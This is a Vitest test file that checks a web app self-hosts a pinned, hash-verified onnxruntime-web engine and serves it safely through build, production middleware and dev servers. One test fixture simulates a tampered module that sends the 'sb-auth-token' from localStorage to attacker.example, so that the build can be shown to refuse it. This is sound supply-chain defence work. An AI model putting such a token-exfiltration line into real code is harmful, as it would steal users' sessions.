// @vitest-environment node
/**
 * The private voice model's engine (the ONNX runtime: an .mjs that runs in our origin next to the session, and its
 * .wasm) is served from our own site, never from a third-party CDN (review 1 #1). transformers.js 4.2.0 points it
 * at cdn.jsdelivr.net when it is imported; services/dictation/whisperEngine.ts moves transformers.js's own pick to
 * `/ort/<version>/` (its tests: whisperEngine.test.ts). This file pins the other half:
 *
 *  - the version the page asks for is the onnxruntime-web transformers.js resolves, the one it pins, the one the
 *    lockfile installs for it and the one pinned in source (`__ORT_WEB_VERSION__`, ORT_RUNTIME_PIN), so the path
 *    and the files never drift;
 *  - the build ships exactly the four files the choice can reach, byte for byte, each under Pages' 25 MiB, and only
 *    when their SHA-256 is the one pinned in source: the engine is first-party code next to the session, so the
 *    bytes are reviewed, not just the version number;
 *  - production serves them through functions/_middleware.ts (public/_routes.json must not exclude /ort/*), with
 *    their content types and immutable caching, to our own origin only (no CORS grant), and a missing file is a
 *    404, never the SPA's index.html with a 200 (the F11 failure), however the asset server labels that page;
 *    public/_headers sets no content type or caching under /ort (Pages applies it to the SPA fallback too);
 *  - `vite dev` and `vite preview` answer /ort/* the same way.
 */
import { createHash } from 'node:crypto';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from 'node:fs';
import http from 'node:http';
import type { AddressInfo } from 'node:net';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';
import { createOnRequest } from '../../functions/_middleware';
import {
  ORT_CACHE_CONTROL,
  ORT_CONTENT_TYPES,
  ORT_RUNTIME_FILES,
  ORT_RUNTIME_PIN,
  ORT_SNIFF_BYTES,
  PAGES_FILE_LIMIT_BYTES,
  looksLikeOrtRuntimeFile,
  ortRuntimePath,
  parseOrtRuntimePath,
  type OrtRuntimeFile
} from '../../services/dictation/ortRuntime';
import { ORT_VERSION_DEFINE, ortRuntime, resolveOrtRuntime } from '../../vite.config';

const ROOT = fileURLToPath(new URL('../..', import.meta.url));
const read = (rel: string) => readFileSync(path.join(ROOT, rel), 'utf8');
const sha = (b: Uint8Array) => createHash('sha256').update(b).digest('hex');
const source = resolveOrtRuntime(ROOT);
const VERSION = source.version;
const fileUrl = (file: string, origin = 'https://dreamstreamstudio.ai') => `${origin}${ortRuntimePath(VERSION)}${file}`;

describe('the version the page asks for is the one the build ships', () => {
  it('__ORT_WEB_VERSION__ equals the onnxruntime-web transformers.js resolves in node_modules, its own pin, and the lockfile', () => {
    expect(__ORT_WEB_VERSION__).toBe(VERSION);
    const installed = JSON.parse(readFileSync(path.join(source.dir, '..', 'package.json'), 'utf8')) as { name: string; version: string };
    expect(installed).toMatchObject({ name: 'onnxruntime-web', version: VERSION });
    expect(source.pinned, "transformers.js's exact pin").toBe(VERSION);
    const lock = JSON.parse(read('package-lock.json')) as { packages: Record<string, { version?: string }> };
    // npm nests it under transformers.js when the app's own onnxruntime-web (the sound model's) is another version.
    const locked = lock.packages['node_modules/@huggingface/transformers/node_modules/onnxruntime-web'] ?? lock.packages['node_modules/onnxruntime-web'];
    expect(locked?.version).toBe(VERSION);
    expect(VERSION).toMatch(/^\d+\.\d+\.\d+/);
    expect(ORT_RUNTIME_PIN.version, 'the version pinned in source (ortRuntime.ts)').toBe(VERSION);
  });

  it('the plugin defines the constant, and refuses to build when the installed engine is not the pinned one', () => {
    const plugin = ortRuntime({ root: ROOT });
    expect((plugin.config as () => { define: Record<string, string> })()).toEqual({ define: { [ORT_VERSION_DEFINE]: JSON.stringify(VERSION) } });
    const error = vi.fn((msg: string) => {
      throw new Error(msg);
    });
    expect(() => (plugin.buildStart as (this: unknown) => void).call({ error })).not.toThrow();
    expect(error).not.toHaveBeenCalled();
  });
});

describe('the build ships exactly the four files the choice can reach', () => {
  it('each is in the package and under the Pages per-file limit (25 MiB)', () => {
    for (const name of ORT_RUNTIME_FILES) {
      const size = statSync(path.join(source.dir, name)).size;
      expect(size, name).toBeGreaterThan(1000);
      expect(size, name).toBeLessThan(PAGES_FILE_LIMIT_BYTES);
    }
  });

  it('generateBundle emits them at ort/<version>/<file>, byte for byte, and nothing else', () => {
    const plugin = ortRuntime({ root: ROOT });
    const emitted: { fileName: string; source: Uint8Array; originalFileName?: string | null }[] = [];
    const ctx = {
      emitFile: (f: { fileName: string; source: Uint8Array; originalFileName?: string | null }) => {
        emitted.push(f);
        return f.fileName;
      },
      error: (msg: string) => {
        throw new Error(msg);
      }
    };
    (plugin.generateBundle as (this: typeof ctx) => void).call(ctx);
    expect(emitted.map((f) => f.fileName).sort()).toEqual(ORT_RUNTIME_FILES.map((f) => `ort/${VERSION}/${f}`).sort());
    for (const f of emitted) {
      const name = f.fileName.split('/').pop()!;
      expect(sha(f.source), name).toBe(sha(readFileSync(path.join(source.dir, name))));
      expect(f.originalFileName, 'the licence report sees where it came from').toBe(path.join(source.dir, name));
    }
  });

  it('the built dist, when there is one, holds them at the versioned path', () => {
    const dist = path.join(ROOT, 'dist');
    if (!existsSync(path.join(dist, 'index.html'))) return; // checked when a build exists (CI runs this after `npm run build`)
    for (const name of ORT_RUNTIME_FILES) {
      const built = path.join(dist, 'ort', VERSION, name);
      expect(existsSync(built), built).toBe(true);
      expect(sha(readFileSync(built)), name).toBe(sha(readFileSync(path.join(source.dir, name))));
    }
  });
});

// The engine's .mjs runs in our origin as first-party code, next to the session. Before the fix the only check
// between node_modules and dist/ort/<version>/ was the version STRING: any bytes sitting in onnxruntime-web/dist
// under the pinned version number (a stale or patched node_modules, a rewritten file) were copied and served as ours.
describe('the self-hosted engine is the published one, byte for byte, not just the published version number', () => {
  const tmpRoots: string[] = [];
  afterAll(() => {
    for (const r of tmpRoots) rmSync(r, { recursive: true, force: true });
  });

  /** A project whose installed onnxruntime-web has this version number and these files (real ones unless overridden). */
  const fakeProject = (opts: { version?: string; files?: Partial<Record<OrtRuntimeFile, string | Uint8Array>> } = {}) => {
    const root = mkdtempSync(path.join(os.tmpdir(), 'ort-integrity-'));
    tmpRoots.push(root);
    const write = (rel: string, body: string | Uint8Array) => {
      const p = path.join(root, rel);
      mkdirSync(path.dirname(p), { recursive: true });
      writeFileSync(p, body);
    };
    const version = opts.version ?? VERSION;
    write('package.json', JSON.stringify({ name: 'app', version: '0.0.0' }));
    const tf = 'node_modules/@huggingface/transformers';
    write(`${tf}/package.json`, JSON.stringify({ name: '@huggingface/transformers', version: '4.2.0', main: 'dist/transformers.node.cjs', dependencies: { 'onnxruntime-web': version } }));
    write(`${tf}/dist/transformers.node.cjs`, 'module.exports = {};');
    const ort = `${tf}/node_modules/onnxruntime-web`;
    write(`${ort}/package.json`, JSON.stringify({ name: 'onnxruntime-web', version, exports: { './webgpu': { require: './dist/ort.webgpu.min.js' } } }));
    write(`${ort}/dist/ort.webgpu.min.js`, '');
    for (const f of ORT_RUNTIME_FILES) write(`${ort}/dist/${f}`, opts.files?.[f] ?? readFileSync(path.join(source.dir, f)));
    return root;
  };

  const build = (root: string) => {
    const plugin = ortRuntime({ root });
    const emitted: string[] = [];
    const ctx = {
      emitFile: (f: { fileName: string }) => {
        emitted.push(f.fileName);
        return f.fileName;
      },
      error: (msg: string) => {
        throw new Error(msg);
      }
    };
    const run = () => {
      (plugin.buildStart as (this: typeof ctx) => void).call(ctx);
      (plugin.generateBundle as (this: typeof ctx) => void).call(ctx);
    };
    return { run, emitted, plugin };
  };

  it('the four files in node_modules have exactly the SHA-256 pinned in source', () => {
    expect(Object.keys(ORT_RUNTIME_PIN.sha256).sort()).toEqual([...ORT_RUNTIME_FILES].sort());
    for (const name of ORT_RUNTIME_FILES) {
      expect(ORT_RUNTIME_PIN.sha256[name], name).toMatch(/^[0-9a-f]{64}$/);
      expect(sha(readFileSync(path.join(source.dir, name))), name).toBe(ORT_RUNTIME_PIN.sha256[name]);
    }
  });

  it('a project with the published bytes builds (the control for the cases below)', () => {
    const { run, emitted } = build(fakeProject());
    expect(run).not.toThrow();
    expect(emitted.sort()).toEqual(ORT_RUNTIME_FILES.map((f) => `ort/${VERSION}/${f}`).sort());
  });

  it.each([
    ['the .mjs was rewritten (a post-install script, a patched or stale node_modules)', { 'ort-wasm-simd-threaded.asyncify.mjs': "export default async function () { await fetch('https://attacker.example/?s=' + encodeURIComponent(localStorage.getItem('sb-auth-token') || '')); }" }],
    ['the .wasm is not the published binary', { 'ort-wasm-simd-threaded.wasm': new Uint8Array([0, 0x61, 0x73, 0x6d, 1, 0, 0, 0]) }],
    ['one byte was appended to the plain .mjs', { 'ort-wasm-simd-threaded.mjs': Buffer.concat([readFileSync(path.join(source.dir, 'ort-wasm-simd-threaded.mjs')), Buffer.from('\n')]) }]
  ] as [string, Partial<Record<OrtRuntimeFile, string | Uint8Array>>][])('refuses to ship when %s: the build stops and emits nothing', (_what, files) => {
    const { run, emitted } = build(fakeProject({ files }));
    expect(run, 'these are not the bytes onnxruntime-web published as this version').toThrow(/integrity|sha-?256/i);
    expect(emitted).toEqual([]);
  });

  it('refuses to build an engine version other than the one pinned in source, even when transformers.js pins it too', () => {
    const { run, emitted } = build(fakeProject({ version: '1.26.1' }));
    expect(run).toThrow(/pinned/i);
    expect(emitted).toEqual([]);
  });

  it('the dev server never serves a file whose bytes are not the pinned ones', async () => {
    const root = fakeProject({ files: { 'ort-wasm-simd-threaded.asyncify.mjs': 'export default 666;' } });
    const dev = ortRuntime({ root });
    (dev.configResolved as (c: unknown) => void)({ root, base: '/', build: { outDir: 'dist' } });
    let mw: ((req: http.IncomingMessage, res: http.ServerResponse, next: () => void) => void) | null = null;
    (dev.configureServer as (s: unknown) => void)({ middlewares: { use: (fn: typeof mw) => (mw = fn) } });
    const server = http.createServer((req, res) => mw!(req, res, () => res.end('next')));
    await new Promise<void>((r) => server.listen(0, '127.0.0.1', r));
    try {
      const base = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
      const bad = await fetch(`${base}/ort/${VERSION}/ort-wasm-simd-threaded.asyncify.mjs`);
      expect(bad.status).toBe(500);
      expect(bad.headers.get('cache-control')).toBe('no-store');
      expect(await bad.text()).not.toContain('666');
      const good = await fetch(`${base}/ort/${VERSION}/ort-wasm-simd-threaded.mjs`);
      expect(good.status).toBe(200);
      expect(sha(new Uint8Array(await good.arrayBuffer()))).toBe(ORT_RUNTIME_PIN.sha256['ort-wasm-simd-threaded.mjs']);
    } finally {
      await new Promise<void>((r) => server.close(() => r()));
    }
  });
});

describe('production: /ort/* goes through the middleware, never the SPA fallback', () => {
  const HUMAN = 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1';
  const SPA = () => new Response('<!doctype html><title>DreamStream</title>', { headers: { 'content-type': 'text/html; charset=utf-8' } });
  const handler = createOnRequest({ streamHostOn: false });
  const go = (url: string, next: () => Promise<Response>, init: { ua?: string; headers?: Record<string, string>; method?: string } = {}) =>
    handler({ request: new Request(url, { method: init.method ?? 'GET', headers: { 'user-agent': init.ua ?? HUMAN, ...(init.headers ?? {}) } }), next, env: {} as never });
  const WASM_MAGIC = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00]);
  const MJS = 'async function ortWasmThreaded(moduleArg = {}) {}\nexport default ortWasmThreaded;';
  const bodyOf = (name: string): string | Uint8Array => (name.endsWith('.wasm') ? WASM_MAGIC : MJS);
  /**
   * What the Pages asset server answers for a real file (seen with `wrangler pages dev`): its own content type (the
   * .mjs as application/javascript), an ETag, revalidate-every-time caching, and the CORS grant it adds to every asset.
   */
  const assetHeaders = (name: string): Record<string, string> => ({
    'content-type': name.endsWith('.wasm') ? 'application/wasm' : 'application/javascript',
    'cache-control': 'public, max-age=0, must-revalidate',
    etag: '"a"',
    'access-control-allow-origin': '*'
  });
  const fileFromAssets = (name: string, init: { status?: number; headers?: Record<string, string>; body?: string | Uint8Array | null } = {}) =>
    vi.fn(async () => new Response(init.body === undefined ? bodyOf(name) : init.body, { status: init.status ?? 200, headers: { ...assetHeaders(name), ...(init.headers ?? {}) } }));
  /** public/_headers as Pages reads it: a path pattern line (`*` is a splat, `:name` a segment), then indented `Name: value` lines. */
  const headerRules = (() => {
    const out: { source: string; pattern: RegExp; headers: [string, string][] }[] = [];
    let cur: (typeof out)[number] | null = null;
    for (const line of read('public/_headers').split('\n')) {
      if (!line.trim() || line.trim().startsWith('#')) continue;
      if (!/^\s/.test(line)) {
        const re = line.trim().replace(/[.+?^${}()|[\]\\]/g, '\\$&').replace(/\*/g, '.*').replace(/:[A-Za-z]\w*/g, '[^/]+');
        cur = { source: line.trim(), pattern: new RegExp(`^${re}$`), headers: [] };
        out.push(cur);
      } else if (cur) {
        const i = line.indexOf(':');
        cur.headers.push([line.slice(0, i).trim(), line.slice(i + 1).trim()]);
      }
    }
    return out;
  })();
  /**
   * What the Pages asset server answers for a path with NO file: the SPA's index.html with a 200, with every
   * matching public/_headers rule already applied (it applies that file to the fallback too, before `next()` returns).
   * `extra` stands for rules a later edit of that file might add.
   */
  const spaFallback = (pathname: string, extra: Record<string, string> = {}) =>
    vi.fn(async () => {
      const headers = new Headers({ 'content-type': 'text/html; charset=utf-8', 'cache-control': 'public, max-age=0, must-revalidate', etag: '"index"', 'access-control-allow-origin': '*' });
      for (const r of headerRules) if (r.pattern.test(pathname)) for (const [k, v] of r.headers) headers.set(k, v);
      for (const [k, v] of Object.entries(extra)) headers.set(k, v);
      return new Response('<!DOCTYPE html>\n<html lang="en" data-ds-skin="atlas"><head><title>DreamStream</title></head></html>', { status: 200, headers });
    });
  const expectNotFound = async (res: Response, what: string) => {
    const body = await res.text();
    expect({ status: res.status, type: res.headers.get('content-type'), cache: res.headers.get('cache-control'), html: /<!doctype html|<html/i.test(body) }, what).toEqual({
      status: 404,
      type: 'text/plain; charset=utf-8',
      cache: 'no-store',
      html: false
    });
  };

  it('public/_routes.json routes /ort/* to the Functions (no exclude matches it), so the middleware sees every request', () => {
    const routes = JSON.parse(read('public/_routes.json')) as { include: string[]; exclude: string[] };
    expect(routes.include).toContain('/*');
    const matches = (pattern: string, p: string) => new RegExp(`^${pattern.replace(/[.+?^${}()|[\]\\]/g, '\\$&').replace(/\*/g, '.*')}$`).test(p);
    for (const name of ORT_RUNTIME_FILES) {
      const p = `${ortRuntimePath(VERSION)}${name}`;
      expect(routes.exclude.filter((e) => matches(e, p)), p).toEqual([]);
    }
  });

  it('serves each file, whole, with its content type, immutable caching and nosniff', async () => {
    for (const name of ORT_RUNTIME_FILES) {
      const next = fileFromAssets(name);
      const res = await go(fileUrl(name), next);
      expect(next).toHaveBeenCalledTimes(1);
      expect(res.status, name).toBe(200);
      expect(res.headers.get('content-type'), name).toBe(name.endsWith('.wasm') ? 'application/wasm' : 'text/javascript; charset=utf-8');
      expect(res.headers.get('cache-control')).toBe(ORT_CACHE_CONTROL);
      expect(res.headers.get('cross-origin-resource-policy')).toBe('same-origin');
      expect(res.headers.get('x-content-type-options')).toBe('nosniff');
      expect(res.headers.get('etag'), 'the validator is kept').toBe('"a"');
      expect(res.headers.get('content-security-policy-report-only'), 'a file, not a page').toBeNull();
      // Looking at the first bytes does not eat them: the browser gets the whole file.
      expect(sha(new Uint8Array(await res.arrayBuffer())), name).toBe(sha(Buffer.from(bodyOf(name))));
    }
  });

  // The Pages asset server adds `Access-Control-Allow-Origin: *` to every asset, and the middleware used to pass it
  // on next to `Cross-Origin-Resource-Policy: same-origin`. CORP only stops no-cors loads; another site's `import()`
  // or `fetch()` is a CORS request, which the `*` allowed. The page's own import and fetch are same-origin on every
  // host (the comics host included), so nothing needs the grant.
  it('goes out to our own origin only: no CORS grant from the asset server is passed on', async () => {
    for (const name of ORT_RUNTIME_FILES) {
      const next = fileFromAssets(name, { headers: { 'access-control-allow-origin': '*', 'access-control-allow-methods': 'GET', 'access-control-expose-headers': 'etag', 'access-control-allow-credentials': 'true' } });
      const res = await go(fileUrl(name), next, { headers: { origin: 'https://elsewhere.example' } });
      expect(res.status, name).toBe(200);
      expect(res.headers.get('cross-origin-resource-policy')).toBe('same-origin');
      const cors = [...res.headers.keys()].filter((k) => k.startsWith('access-control-'));
      expect(cors, `${name}: no other site may import or fetch the engine through CORS`).toEqual([]);
    }
    const revalidated = await go(fileUrl('ort-wasm-simd-threaded.mjs'), fileFromAssets('ort-wasm-simd-threaded.mjs', { status: 304, body: null }), { headers: { 'if-none-match': '"a"' } });
    expect(revalidated.status).toBe(304);
    expect(revalidated.headers.get('access-control-allow-origin')).toBeNull();
  });

  it('only the pinned version reaches the asset server: any other version is a 404 without asking it', async () => {
    // An old tab after a deploy that moved to a new onnxruntime-web asks for the old version's folder: gone.
    for (const p of ['/ort/1.0.0/ort-wasm-simd-threaded.asyncify.wasm', '/ort/1.0.0/ort-wasm-simd-threaded.mjs', '/ort/9.9.9/ort-wasm-simd-threaded.asyncify.wasm', `/ort/${VERSION}-next/ort-wasm-simd-threaded.mjs`]) {
      const next = spaFallback(p);
      await expectNotFound(await go(`https://dreamstreamstudio.ai${p}`, next), p);
      expect(next, p).not.toHaveBeenCalled();
    }
  });

  it("a missing file (the asset server's SPA answer: index.html with a 200) is a plain 404 that nothing keeps", async () => {
    // A deploy that lacks a file of the pinned version (the build stops before that can happen; this is the last line).
    for (const name of ORT_RUNTIME_FILES) {
      const p = `${ortRuntimePath(VERSION)}${name}`;
      const next = spaFallback(p);
      await expectNotFound(await go(fileUrl(name), next), name);
      expect(next).toHaveBeenCalledTimes(1);
    }
    // Any other non-file answer too (a redirect, an error).
    for (const status of [301, 308, 404, 405, 500]) {
      const r = await go(fileUrl('ort-wasm-simd-threaded.mjs'), async () => new Response(null, { status, headers: status < 400 ? { location: '/' } : {} }));
      expect(r.status, String(status)).toBe(404);
    }
  });

  // What really happened on Pages (seen with `wrangler pages dev`): the `/ort/*.mjs` and `/ort/*.wasm` Content-Type
  // rules this branch once had in public/_headers were applied by the asset server to its SPA fallback, so
  // index.html came back labelled text/javascript (or application/wasm) and `immutable`; the middleware, which only
  // refused text/html, passed it on as the engine, cached for a year. The label is not trusted any more: the first
  // bytes are.
  it('index.html is never the engine, however the asset server labels it (a _headers rule can rewrite its content type)', async () => {
    for (const name of ORT_RUNTIME_FILES) {
      const p = `${ortRuntimePath(VERSION)}${name}`;
      const relabelled = { 'content-type': name.endsWith('.wasm') ? ORT_CONTENT_TYPES.wasm : ORT_CONTENT_TYPES.mjs, 'cache-control': ORT_CACHE_CONTROL };
      await expectNotFound(await go(fileUrl(name), spaFallback(p, relabelled)), `${name} labelled ${relabelled['content-type']}`);
      await expectNotFound(await go(fileUrl(name), spaFallback(p, { 'content-type': 'application/octet-stream' })), `${name} labelled application/octet-stream`);
    }
    // A JSON or empty answer is not a WebAssembly binary either; an empty one is not a module.
    await expectNotFound(await go(fileUrl('ort-wasm-simd-threaded.wasm'), fileFromAssets('ort-wasm-simd-threaded.wasm', { body: '{"error":"gone"}' })), 'json as wasm');
    await expectNotFound(await go(fileUrl('ort-wasm-simd-threaded.wasm'), fileFromAssets('ort-wasm-simd-threaded.wasm', { body: new Uint8Array([0, 0x61]) })), 'a truncated wasm');
    await expectNotFound(await go(fileUrl('ort-wasm-simd-threaded.mjs'), fileFromAssets('ort-wasm-simd-threaded.mjs', { body: '' })), 'an empty module');
    await expectNotFound(await go(fileUrl('ort-wasm-simd-threaded.mjs'), fileFromAssets('ort-wasm-simd-threaded.mjs', { body: `\ufeff \n\t<!doctype html><html></html>` })), 'html after a byte-order mark and white space');
    await expectNotFound(await go(fileUrl('ort-wasm-simd-threaded.mjs'), fileFromAssets('ort-wasm-simd-threaded.mjs', { body: ' '.repeat(ORT_SNIFF_BYTES * 4) + '<html>' })), 'html after a wall of white space');
  });

  it('the byte check: WebAssembly by its magic number, a module by not starting like a page', () => {
    const bytes = (t: string) => new TextEncoder().encode(t);
    expect(looksLikeOrtRuntimeFile('ort-wasm-simd-threaded.wasm', WASM_MAGIC)).toBe(true);
    expect(looksLikeOrtRuntimeFile('ort-wasm-simd-threaded.asyncify.wasm', bytes('<!DOCTYPE html>'))).toBe(false);
    expect(looksLikeOrtRuntimeFile('ort-wasm-simd-threaded.wasm', new Uint8Array([0, 0x61, 0x73]))).toBeNull(); // needs one more byte
    expect(looksLikeOrtRuntimeFile('ort-wasm-simd-threaded.wasm', new Uint8Array([0, 0x61, 0x73]), true)).toBe(false);
    expect(looksLikeOrtRuntimeFile('ort-wasm-simd-threaded.mjs', bytes('async function ortWasmThreaded'))).toBe(true);
    expect(looksLikeOrtRuntimeFile('ort-wasm-simd-threaded.asyncify.mjs', bytes('\n  <!DOCTYPE html>'))).toBe(false);
    expect(looksLikeOrtRuntimeFile('ort-wasm-simd-threaded.mjs', bytes('  \n'))).toBeNull();
    expect(looksLikeOrtRuntimeFile('ort-wasm-simd-threaded.mjs', bytes('  \n'), true)).toBe(false);
    // The real files pass.
    for (const name of ORT_RUNTIME_FILES) expect(looksLikeOrtRuntimeFile(name, readFileSync(path.join(source.dir, name)).subarray(0, ORT_SNIFF_BYTES)), name).toBe(true);
  });

  it('a file split into tiny network chunks is still recognised and still arrives whole', async () => {
    for (const name of ['ort-wasm-simd-threaded.wasm', 'ort-wasm-simd-threaded.mjs'] as const) {
      const whole = Buffer.from(name.endsWith('.wasm') ? WASM_MAGIC : `  \n${MJS}`);
      const dribble = () =>
        new ReadableStream<Uint8Array>({
          start(c) {
            for (const b of whole) c.enqueue(new Uint8Array([b]));
            c.close();
          }
        });
      const res = await go(fileUrl(name), async () => new Response(dribble(), { headers: assetHeaders(name) }));
      expect(res.status, name).toBe(200);
      expect(sha(new Uint8Array(await res.arrayBuffer())), name).toBe(sha(whole));
    }
  });

  it('answers that carry no readable start of the file (HEAD, a later byte range) pass on the asset server’s word, never as HTML', async () => {
    const head = await go(fileUrl('ort-wasm-simd-threaded.asyncify.wasm'), fileFromAssets('ort-wasm-simd-threaded.asyncify.wasm', { body: null }), { method: 'HEAD' });
    expect(head.status).toBe(200);
    expect(head.headers.get('content-type')).toBe('application/wasm');
    const htmlHead = await go(fileUrl('ort-wasm-simd-threaded.asyncify.wasm'), async () => new Response(null, { headers: { 'content-type': 'text/html; charset=utf-8' } }), { method: 'HEAD' });
    expect(htmlHead.status).toBe(404);
    // A resumed download: bytes from the middle of the real file.
    const tail = await go(fileUrl('ort-wasm-simd-threaded.wasm'), fileFromAssets('ort-wasm-simd-threaded.wasm', { status: 206, body: new Uint8Array([9, 9, 9, 9]), headers: { 'content-range': 'bytes 4-7/8' } }), { headers: { range: 'bytes=4-' } });
    expect(tail.status).toBe(206);
    expect(tail.headers.get('content-range')).toBe('bytes 4-7/8');
    // A range from byte 0 does carry the start, so it is checked like a whole file.
    const start = await go(fileUrl('ort-wasm-simd-threaded.wasm'), fileFromAssets('ort-wasm-simd-threaded.wasm', { status: 206, body: '<!DO', headers: { 'content-range': 'bytes 0-3/1024' } }), { headers: { range: 'bytes=0-3' } });
    expect(start.status).toBe(404);
  });

  it('anything under /ort/ that is not one of the four files is a 404 without asking the asset server', async () => {
    for (const p of ['/ort', '/ort/', `/ort/${VERSION}/`, `/ort/${VERSION}/ort-wasm-simd-threaded.jsep.mjs`, `/ort/${VERSION}/ort.bundle.min.mjs`, '/ort/latest/ort-wasm-simd-threaded.mjs', `/ort/${VERSION}/sub/ort-wasm-simd-threaded.mjs`]) {
      const next = vi.fn(async () => SPA());
      await expectNotFound(await go(`https://dreamstreamstudio.ai${p}`, next), p);
      expect(next, p).not.toHaveBeenCalled();
    }
    expect(parseOrtRuntimePath(`/ort/${VERSION}/ort-wasm-simd-threaded.asyncify.wasm`)).toEqual({ version: VERSION, file: 'ort-wasm-simd-threaded.asyncify.wasm' });
  });

  it('an automated browser gets the file, not the agent check-in (a page in it may use voice)', async () => {
    const res = await go(fileUrl('ort-wasm-simd-threaded.asyncify.mjs'), fileFromAssets('ort-wasm-simd-threaded.asyncify.mjs'), { ua: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/140.0.0.0 Safari/537.36' });
    expect(res.status).toBe(200);
    expect(res.headers.get('location')).toBeNull();
  });

  it('the comics host (proxied to the Pages origin) is served, not redirected; a revalidation keeps its 304', async () => {
    const proxied = await go(fileUrl('ort-wasm-simd-threaded.wasm', 'https://comic2.pages.dev'), fileFromAssets('ort-wasm-simd-threaded.wasm'), { headers: { 'x-forwarded-host': 'comics.dreamstreamstudio.ai' } });
    expect(proxied.status).toBe(200);
    expect(proxied.headers.get('content-type')).toBe('application/wasm');
    const revalidated = await go(fileUrl('ort-wasm-simd-threaded.wasm'), async () => new Response(null, { status: 304, headers: { etag: '"a"' } }), { headers: { 'if-none-match': '"a"' } });
    expect(revalidated.status).toBe(304);
    expect(revalidated.headers.get('cache-control')).toBe(ORT_CACHE_CONTROL);
  });

  // Pages applies public/_headers to whatever its asset server answers for a path, the SPA fallback included, before
  // the middleware sees it. A Content-Type rule there turned index.html into "the engine" (above), and a
  // Cache-Control rule would mark any fallback immutable. The middleware sets both itself, on files it has checked.
  it('public/_headers sets no content type, caching or CORS grant for any /ort path (the middleware owns them)', () => {
    const OWNED = ['content-type', 'cache-control', 'access-control-allow-origin'];
    const paths = [...ORT_RUNTIME_FILES.map((f) => `${ortRuntimePath(VERSION)}${f}`), '/ort/1.0.0/ort-wasm-simd-threaded.mjs', '/ort/1.0.0/ort-wasm-simd-threaded.asyncify.wasm', '/ort/', '/ort/anything/at/all.html'];
    expect(headerRules.length, 'the file was parsed').toBeGreaterThan(3);
    expect(headerRules.some((r) => r.source === '/*'), 'the site-wide rule is there (and is seen to match /ort)').toBe(true);
    for (const p of paths) {
      const matching = headerRules.filter((r) => r.pattern.test(p));
      expect(matching.map((r) => r.source), p).toContain('/*');
      const named = matching.flatMap((r) => r.headers.filter(([k]) => OWNED.includes(k.toLowerCase())).map(([k, v]) => `${r.source} → ${k}: ${v}`));
      expect(named, p).toEqual([]);
    }
    // No rule is written for /ort at all: one that only names another header today is one edit from naming these.
    expect(headerRules.filter((r) => /^\/ort\b/i.test(r.source)).map((r) => r.source)).toEqual([]);
  });
});

describe('vite dev and vite preview answer /ort/* the same way', () => {
  let tmp = '';
  let server: http.Server;
  let base = '';
  let devServer: http.Server;
  let devBase = '';

  /** Run a plugin hook's middleware on a real local server (loopback only). */
  const serve = async (register: (s: { middlewares: { use: (fn: http.RequestListener & ((req: http.IncomingMessage, res: http.ServerResponse, next: () => void) => void)) => void } }) => void) => {
    let mw: ((req: http.IncomingMessage, res: http.ServerResponse, next: () => void) => void) | null = null;
    register({ middlewares: { use: (fn) => (mw = fn) } });
    const s = http.createServer((req, res) =>
      mw!(req, res, () => {
        res.statusCode = 299; // "passed on": the next middleware would answer
        res.end('next');
      })
    );
    await new Promise<void>((r) => s.listen(0, '127.0.0.1', r));
    return { s, url: `http://127.0.0.1:${(s.address() as AddressInfo).port}` };
  };

  beforeAll(async () => {
    tmp = mkdtempSync(path.join(os.tmpdir(), 'ort-preview-'));
    const folder = path.join(tmp, 'ort', VERSION);
    mkdirSync(folder, { recursive: true });
    // The build's real file (preview checks the bytes too), and one that is not the pinned engine.
    writeFileSync(path.join(folder, 'ort-wasm-simd-threaded.mjs'), readFileSync(path.join(source.dir, 'ort-wasm-simd-threaded.mjs')));
    writeFileSync(path.join(folder, 'ort-wasm-simd-threaded.asyncify.mjs'), 'export default 1;');
    const preview = ortRuntime({ root: ROOT });
    (preview.configResolved as (c: unknown) => void)({ root: tmp, base: '/', build: { outDir: '.' } });
    ({ s: server, url: base } = await serve((s) => (preview.configurePreviewServer as (s: unknown) => void)(s)));
    const dev = ortRuntime({ root: ROOT });
    (dev.configResolved as (c: unknown) => void)({ root: ROOT, base: '/', build: { outDir: 'dist' } });
    ({ s: devServer, url: devBase } = await serve((s) => (dev.configureServer as (s: unknown) => void)(s)));
  });
  afterAll(async () => {
    await new Promise<void>((r) => server.close(() => r()));
    await new Promise<void>((r) => devServer.close(() => r()));
    rmSync(tmp, { recursive: true, force: true });
  });

  it('preview serves the built file with its headers, and a 404 (not index.html) for one the build lacks', async () => {
    const ok = await fetch(`${base}/ort/${VERSION}/ort-wasm-simd-threaded.mjs`);
    expect(ok.status).toBe(200);
    expect(ok.headers.get('content-type')).toBe(ORT_CONTENT_TYPES.mjs);
    expect(ok.headers.get('cache-control')).toBe(ORT_CACHE_CONTROL);
    expect(ok.headers.get('access-control-allow-origin')).toBeNull();
    expect(sha(new Uint8Array(await ok.arrayBuffer()))).toBe(ORT_RUNTIME_PIN.sha256['ort-wasm-simd-threaded.mjs']);
    const tampered = await fetch(`${base}/ort/${VERSION}/ort-wasm-simd-threaded.asyncify.mjs`);
    expect(tampered.status, 'a file that is not the pinned engine is never served').toBe(500);
    expect(await tampered.text()).not.toContain('export default 1;');
    const missing = await fetch(`${base}/ort/${VERSION}/ort-wasm-simd-threaded.wasm`);
    expect(missing.status).toBe(404);
    expect(missing.headers.get('content-type')).toBe('text/plain; charset=utf-8');
    expect((await fetch(`${base}/ort/0.0.1/ort-wasm-simd-threaded.mjs`)).status).toBe(404);
    expect((await fetch(`${base}/index.html`)).status, 'other paths are passed on').toBe(299);
  });

  it('dev serves the four files straight from the package', async () => {
    for (const name of ORT_RUNTIME_FILES) {
      const res = await fetch(`${devBase}/ort/${VERSION}/${name}`, { method: 'HEAD' });
      expect(res.status, name).toBe(200);
      expect(res.headers.get('content-type'), name).toBe(name.endsWith('.wasm') ? ORT_CONTENT_TYPES.wasm : ORT_CONTENT_TYPES.mjs);
      expect(Number(res.headers.get('content-length')), name).toBe(statSync(path.join(source.dir, name)).size);
    }
